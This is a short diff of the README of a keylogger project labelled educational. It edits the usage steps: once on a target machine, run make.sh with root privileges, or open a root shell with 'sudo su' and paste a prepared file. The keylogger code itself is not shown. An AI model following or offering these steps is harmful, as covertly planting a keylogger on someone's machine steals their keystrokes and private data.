@@ -10,8 +10,8 @@ This project of a Key Logger is for **educational purposes**, it has been create
 ## How2UseIt
 
 Once you gain access to the target machine, you have to options:
-1. Inject and execute the `make.sh` .
-2. Paste and execute the content of `toBePasted.txt` .
+1. Inject and execute (with root priviledges) the `make.sh` file.
+2. Create a root shell with `sudo su` paste and execute the content of `toBePasted.txt` .
 
 But before you need to configure it for your own setup. Here's how:
 
